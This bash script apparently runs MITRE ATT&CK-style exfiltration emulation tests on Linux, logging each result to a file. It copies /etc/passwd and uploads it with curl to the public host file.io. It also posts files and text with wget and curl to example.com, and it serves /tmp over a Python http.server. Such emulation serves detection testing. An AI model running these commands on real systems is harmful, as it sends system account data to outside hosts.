# Exfiltration Tests
echo "Starting Exfiltration Tests..."

# Create output folder
output_folder="${PWD}/Linux_output/Exfiltration"
mkdir -p "$output_folder"

# Function to log output
log_output() {
    local test_id=$1
    local output=$2
    echo -e "### ${test_id} ###\n${output}\n" >> "${output_folder}/Exfiltration_output.txt"
}

# T1048.002 Test 2 - Exfiltrate data HTTPS using curl freebsd,linux or macos
test_id="T1048.002 Test 2"
cp /etc/passwd "${PWD}/Exfildata.txt"
file="${PWD}/Exfildata.txt"
output=$(curl -F "file=@${file}" -F 'maxDownloads=1' -F 'autoDelete=true' https://file.io/ 2>&1)
log_output "$test_id" "$output"

# T1048.002 Test 3 - Exfiltrate data in a file over HTTPS using wget
test_id="T1048.002 Test 3"
output=$(wget --post-file="${file}" --timeout=5 --no-check-certificate https://example.com/ --delete-after 2>&1)
log_output "$test_id" "$output"

# T1048.002 Test 4 - Exfiltrate data as text over HTTPS using wget
test_id="T1048.002 Test 4"
output=$(wget --post-data="msg=Testing_Exfiltration_T1048.002" --timeout=5 --no-check-certificate https://example.com/ --delete-after 2>&1)
log_output "$test_id" "$output"

# T1048.003 Test 8 - Python3 http.server
test_id="T1048.003 Test 8"
if [ $(which python3) ]; then
    # Change to the /tmp directory
    cd /tmp

    # Start the Python3 http.server on port 9090
    python3 -m http.server 9090 & PID=$!

    # Wait for 10 seconds
    sleep 10

    # Adversary system retrieves the data
    output=$(wget http://localhost:9090 2>&1)
    log_output "$test_id" "$output"

    # Terminate the Python3 http.server
    kill $PID
fi

# T1030 Data Transfer Size Limits test 1
test_id="T1030 Test 1"
file="${PWD}/file_data.txt"
output=$(curl -T "${file}" https://example.com 2>&1)
log_output "$test_id" "$output"

# End of Exfiltration Tests
echo "Exfiltration tests completed."